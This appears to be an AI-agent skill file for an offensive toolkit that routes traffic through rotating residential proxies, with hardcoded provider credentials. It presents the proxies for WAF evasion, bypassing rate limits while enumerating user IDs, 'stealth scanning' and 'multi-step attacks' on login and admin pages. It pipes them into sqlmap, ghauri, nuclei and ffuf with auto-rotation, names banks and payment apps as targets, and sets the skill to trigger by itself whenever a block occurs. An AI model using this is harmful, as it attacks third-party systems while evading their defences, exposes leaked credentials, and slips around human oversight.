---
name: residential-proxy-skill
description: "AGHORI Residential Proxy v10.2 - 195+ countries residential IPs via DataImpulse. Bypass WAF, rate limits, geo-blocks, Cloudflare. Auto-rotate IPs, sticky sessions. Use when: proxy, residential IP, WAF blocked, rate limit, 429 error, geo-block, country IP, rotate IP, Cloudflare block, IP ban, different location, bypass block."
allowed-tools: Bash, Read, Write, Glob, Grep
---

# DataImpulse Residential Proxy Skill v10.2

**HARAMI PROXY** - Residential IPs from 195+ countries!

## ⚠️ AUTO-TRIGGER CONDITIONS

This skill AUTOMATICALLY activates when:
- WAF blocking requests
- Rate limit (429) errors
- Geo-restricted content
- IP ban detected
- Need different country IP

## CREDENTIALS

```
Login:    d46843121f4416cadf5c
Password: d61216d4514309b1
Host:     gw.dataimpulse.com
Port:     823 (HTTP/HTTPS), 824 (SOCKS5)
```

## SCRIPTS LOCATION (Inside Skill!)

```bash
# Run the local script from this skill folder:
python3 scripts/dataimpulse_proxy.py get COUNTRY
python3 scripts/dataimpulse_proxy.py get COUNTRY sticky
```

## LEGACY TOOL LOCATION

```
/Users/niwash/.claude/tools/dataimpulse_proxy.py
```

## PROXY FORMAT

```
# Basic format
http://LOGIN__PARAMS:PASSWORD@HOST:PORT

# With country (India)
http://d46843121f4416cadf5c__cr.in:d61216d4514309b1@gw.dataimpulse.com:823

# With sticky session (same IP for 30 min)
http://d46843121f4416cadf5c__cr.in;sessid.abc123:d61216d4514309b1@gw.dataimpulse.com:823

# Multiple countries (US or India)
http://d46843121f4416cadf5c__cr.us,in:d61216d4514309b1@gw.dataimpulse.com:823

# SOCKS5
socks5://d46843121f4416cadf5c__cr.in:d61216d4514309b1@gw.dataimpulse.com:824
```

## QUICK COMMANDS

```bash
PROXY="/Users/niwash/.claude/tools/dataimpulse_proxy.py"

# Get proxy string
python3 $PROXY get                     # Random country
python3 $PROXY get india               # India IP
python3 $PROXY get us                  # US IP
python3 $PROXY get us sticky           # US with sticky session
python3 $PROXY get india socks5        # India SOCKS5

# Test proxy
python3 $PROXY test                    # Test random
python3 $PROXY test india              # Test India proxy

# Curl through proxy
python3 $PROXY curl https://api.ipify.org
python3 $PROXY curl https://example.com india

# List country codes
python3 $PROXY countries
```

## PARAMETERS

| Parameter | Format | Description |
|-----------|--------|-------------|
| Country | `cr.XX` | ISO 2-letter code (e.g., `cr.in`, `cr.us`) |
| Multi-country | `cr.us,in` | Multiple countries |
| Session ID | `sessid.XXX` | Sticky session (30 min same IP) |
| State | `st.XX` | US state targeting |
| City | `city.XXX` | City targeting |
| ASN | `asn.XXXX` | Autonomous System Number |

Parameters are joined with `;` and added after `__` in username.

## COUNTRY CODES (Common)

| Country | Code | Country | Code |
|---------|------|---------|------|
| India | in | USA | us |
| UK | gb | Germany | de |
| France | fr | Russia | ru |
| China | cn | Japan | jp |
| Australia | au | Canada | ca |
| Indonesia | id | Malaysia | my |
| Singapore | sg | Thailand | th |
| Vietnam | vn | Philippines | ph |
| Pakistan | pk | Bangladesh | bd |
| UAE | ae | Saudi | sa |
| Turkey | tr | Brazil | br |
| Nigeria | ng | South Africa | za |

## PYTHON USAGE

```python
from dataimpulse_proxy import DataImpulseProxy
import requests

proxy = DataImpulseProxy()

# Get proxy for India
p = proxy.get_proxy_string('india')
response = requests.get('https://example.com', proxies=p['requests'])

# Sticky session (same IP for 30 min)
p = proxy.get_proxy_string('us', sticky=True)
response = requests.get('https://example.com', proxies=p['requests'])

# Test proxy
result = proxy.test_proxy('india')
print(f"IP: {result['ip']}, City: {result['city']}")
```

## BASH USAGE

```bash
# Quick proxy string
PROXY="http://d46843121f4416cadf5c__cr.in:d61216d4514309b1@gw.dataimpulse.com:823"

# Curl
curl -x "$PROXY" https://api.ipify.org

# Wget
wget -e use_proxy=yes -e http_proxy="$PROXY" https://example.com

# Set environment
export HTTP_PROXY="$PROXY"
export HTTPS_PROXY="$PROXY"
```

## INTEGRATION WITH TOOLS

### SQLMap
```bash
# India proxy
sqlmap -u "http://target.com/page?id=1" \
  --proxy="http://d46843121f4416cadf5c__cr.in:d61216d4514309b1@gw.dataimpulse.com:823" \
  --batch --dbs

# Or use tool
sqlmap -u "URL" $(python3 /Users/niwash/.claude/tools/dataimpulse_proxy.py get india | grep "SQLMap:" | cut -d':' -f2-)
```

### Nuclei
```bash
nuclei -u "http://target.com" \
  -proxy "http://d46843121f4416cadf5c__cr.in:d61216d4514309b1@gw.dataimpulse.com:823"
```

### FFUF
```bash
ffuf -u "http://target.com/FUZZ" -w wordlist.txt \
  -x "http://d46843121f4416cadf5c__cr.in:d61216d4514309b1@gw.dataimpulse.com:823"
```

### Httpx
```bash
httpx -l urls.txt \
  -http-proxy "http://d46843121f4416cadf5c__cr.in:d61216d4514309b1@gw.dataimpulse.com:823"
```

### Ghauri
```bash
ghauri -u "http://target.com/page?id=1" \
  --proxy="http://d46843121f4416cadf5c__cr.in:d61216d4514309b1@gw.dataimpulse.com:823"
```

## USE CASES

### 1. Bypass Geo-Restrictions
```bash
# Access US-only content
python3 $PROXY curl https://us-only-site.com us
```

### 2. Bypass Rate Limiting
```bash
# Rotate IP every request (no sticky)
for i in {1..100}; do
    python3 $PROXY curl "https://target.com/api/user/$i" india
done
```

### 3. WAF Evasion
```bash
# Use residential IP (less suspicious than datacenter)
sqlmap -u "URL" --proxy="$(python3 $PROXY get india | grep URL | awk '{print $2}')" --random-agent
```

### 4. Region-Specific Testing
```bash
# Test app behavior in different countries
for country in us uk de jp in; do
    echo "Testing from $country:"
    python3 $PROXY curl "https://app.com/api/config" $country | jq '.region'
done
```

### 5. Sticky Session for Multi-Step Attacks
```bash
# Same IP for entire attack chain
PROXY=$(python3 /Users/niwash/.claude/tools/dataimpulse_proxy.py get us sticky | grep "URL:" | awk '{print $2}')

# All requests use same IP for 30 minutes
curl -x "$PROXY" "https://target.com/login"
curl -x "$PROXY" "https://target.com/dashboard"
curl -x "$PROXY" "https://target.com/admin"
```

## AGHORI INTEGRATION

When agents need residential proxy:

```python
# In any agent
from dataimpulse_proxy import DataImpulseProxy

proxy = DataImpulseProxy()

# For SQLi exploitation
p = proxy.get_proxy_string('india', sticky=True)
# Use p['requests'] with requests library
# Use p['sqlmap'] for sqlmap command

# For scanning
p = proxy.get_proxy_string()  # Random rotating
# Use p['nuclei'] for nuclei command
```

## WHEN TO USE

1. **WAF Blocking** - Residential IPs are less likely to be blocked
2. **Rate Limiting** - Rotate IPs to bypass rate limits
3. **Geo-Restrictions** - Access region-locked content
4. **Stealth Scanning** - Look like normal user traffic
5. **Multi-Step Attacks** - Sticky session for consistent identity

## PORTS

| Protocol | Port | Use Case |
|----------|------|----------|
| HTTP/HTTPS | 823 | Most tools, browsers |
| SOCKS5 | 824 | Full TCP support, Tor-style |

## SESSION BEHAVIOR

- **No sessid**: IP rotates on each request
- **With sessid**: Same IP for ~30 minutes
- **sessid.XXX**: Different XXX = different IPs
- **Auto-failover**: If IP goes offline, auto-switches to new one

---

## ADVANCED: FAILOVER LOGIC

```python
#!/usr/bin/env python3
"""AGHORI Proxy Manager v10.2 - Multi-provider with failover"""

import requests
import time
from dataclasses import dataclass
from typing import Optional, List

@dataclass
class ProxyProvider:
    name: str
    host: str
    port: int
    username: str
    password: str
    countries: List[str]
    
class ProxyManager:
    def __init__(self):
        self.providers = {
            'dataimpulse': ProxyProvider(
                name='DataImpulse',
                host='gw.dataimpulse.com',
                port=823,
                username='d46843121f4416cadf5c',
                password='d61216d4514309b1',
                countries=['in', 'us', 'gb', 'de', 'jp', 'au', 'ca', 'fr']
            ),
            'brightdata': ProxyProvider(
                name='BrightData',
                host='brd.superproxy.io',
                port=22225,
                username='',  # Add your credentials
                password='',
                countries=['us', 'gb', 'de', 'fr', 'jp', 'au']
            ),
            'oxylabs': ProxyProvider(
                name='Oxylabs',
                host='pr.oxylabs.io',
                port=7777,
                username='',  # Add your credentials
                password='',
                countries=['us', 'gb', 'de', 'in', 'jp']
            )
        }
        self.current_provider = 'dataimpulse'
        self.failure_count = {}
        
    def get_proxy(self, country: str = 'us', sticky: bool = False) -> dict:
        """Get proxy with automatic failover"""
        providers_to_try = ['dataimpulse', 'brightdata', 'oxylabs']
        
        for provider_name in providers_to_try:
            provider = self.providers.get(provider_name)
            if not provider or not provider.username:
                continue
                
            proxy_url = self._build_proxy_url(provider, country, sticky)
            
            if self._test_proxy(proxy_url):
                self.current_provider = provider_name
                self.failure_count[provider_name] = 0
                return {
                    'provider': provider_name,
                    'proxy': proxy_url,
                    'requests': {'http': proxy_url, 'https': proxy_url}
                }
            else:
                self.failure_count[provider_name] = self.failure_count.get(provider_name, 0) + 1
                
        raise Exception("All proxy providers failed!")
    
    def _build_proxy_url(self, provider: ProxyProvider, country: str, sticky: bool) -> str:
        username = provider.username
        if country:
            username += f"__cr.{country}"
        if sticky:
            username += f";sessid.{int(time.time())}"
        
        return f"http://{username}:{provider.password}@{provider.host}:{provider.port}"
    
    def _test_proxy(self, proxy_url: str) -> bool:
        """Test if proxy is working"""
        try:
            resp = requests.get(
                'https://api.ipify.org?format=json',
                proxies={'http': proxy_url, 'https': proxy_url},
                timeout=10
            )
            return resp.status_code == 200
        except:
            return False
    
    def speed_test(self, country: str = 'us') -> dict:
        """Test proxy speeds across providers"""
        results = {}
        
        for name, provider in self.providers.items():
            if not provider.username:
                continue
                
            proxy_url = self._build_proxy_url(provider, country, False)
            
            start = time.time()
            try:
                resp = requests.get(
                    'https://httpbin.org/get',
                    proxies={'http': proxy_url, 'https': proxy_url},
                    timeout=30
                )
                latency = time.time() - start
                results[name] = {
                    'latency': round(latency, 2),
                    'status': 'OK',
                    'ip': resp.json().get('origin')
                }
            except Exception as e:
                results[name] = {'latency': None, 'status': 'FAILED', 'error': str(e)}
        
        return results
    
    def get_best_proxy(self, country: str = 'us') -> str:
        """Get fastest working proxy"""
        speeds = self.speed_test(country)
        
        # Filter working proxies and sort by latency
        working = {k: v for k, v in speeds.items() if v['status'] == 'OK'}
        if not working:
            raise Exception("No working proxies!")
        
        best = min(working.items(), key=lambda x: x[1]['latency'])
        return self.get_proxy(country)

# Usage
manager = ProxyManager()
# proxy = manager.get_proxy('india', sticky=True)
# speeds = manager.speed_test('us')
# best = manager.get_best_proxy('india')
```

---

## COUNTRY-SPECIFIC RECOMMENDATIONS

```python
COUNTRY_RECOMMENDATIONS = {
    'india': {
        'provider': 'dataimpulse',  # Best coverage for India
        'sticky': True,  # Many Indian sites are session-sensitive
        'notes': 'Use for Paytm, PhonePe, Indian banks'
    },
    'us': {
        'provider': 'any',
        'sticky': False,
        'notes': 'All providers have good US coverage'
    },
    'china': {
        'provider': 'oxylabs',  # Best for China
        'sticky': True,
        'notes': 'Limited availability, expect higher latency'
    },
    'russia': {
        'provider': 'dataimpulse',
        'sticky': False,
        'notes': 'VK, Yandex testing'
    },
    'middle_east': {
        'countries': ['ae', 'sa', 'qa', 'kw'],
        'provider': 'dataimpulse',
        'sticky': True
    }
}

def get_recommended_proxy(target_country: str):
    rec = COUNTRY_RECOMMENDATIONS.get(target_country, {})
    manager = ProxyManager()
    return manager.get_proxy(target_country, sticky=rec.get('sticky', False))
```

---

## INTEGRATION WITH SECURITY TOOLS (ENHANCED)

```bash
# Automatic proxy rotation for SQLMap
sqlmap_with_rotation() {
    URL="$1"
    COUNTRY="${2:-us}"
    
    for i in {1..5}; do
        PROXY=$(python3 /Users/niwash/.claude/tools/dataimpulse_proxy.py get "$COUNTRY" | grep "URL:" | awk '{print $2}')
        
        echo "[*] Attempt $i with proxy from $COUNTRY"
        sqlmap -u "$URL" --proxy="$PROXY" --batch --level=3 --risk=2 --dbs
        
        if [ $? -eq 0 ]; then
            echo "[+] SQLMap completed successfully"
            break
        else
            echo "[-] Failed, rotating proxy..."
            sleep 2
        fi
    done
}

# Nuclei with proxy rotation
nuclei_with_rotation() {
    TARGET="$1"
    COUNTRY="${2:-us}"
    
    PROXY=$(python3 /Users/niwash/.claude/tools/dataimpulse_proxy.py get "$COUNTRY" sticky | grep "URL:" | awk '{print $2}')
    
    nuclei -u "$TARGET" -proxy "$PROXY" -severity critical,high -json -o nuclei_results.json
}

# Parallel scanning with different country IPs
parallel_geo_scan() {
    TARGET="$1"
    
    for country in us gb de in jp au; do
        (
            PROXY=$(python3 /Users/niwash/.claude/tools/dataimpulse_proxy.py get "$country" | grep "URL:" | awk '{print $2}')
            curl -x "$PROXY" "https://$TARGET" -o "/tmp/response_$country.html" -w "%{http_code}" > "/tmp/status_$country.txt"
            echo "[*] $country: $(cat /tmp/status_$country.txt)"
        ) &
    done
    wait
}
```

---

**"RESIDENTIAL PROXY CHAHIYE? DATAIMPULSE DEGA - FAILOVER + SPEED TEST + 195 COUNTRIES!"**
